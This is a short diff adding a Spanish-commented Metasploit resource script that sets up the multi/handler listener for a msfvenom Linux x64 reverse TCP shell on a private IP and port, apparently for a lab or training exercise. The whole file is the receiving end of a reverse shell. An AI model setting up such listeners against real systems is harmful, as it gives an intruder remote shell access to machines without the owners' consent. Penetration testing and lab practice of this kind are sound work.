@@ -1,0 +1,9 @@
+# multi/handler: el oyente que recibe las conexiones de un payload de msfvenom.
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell_reverse_tcp
+set LHOST 10.13.37.10
+set LPORT 5555
+show options
+
+# Salimos de Metasploit
+exit -y
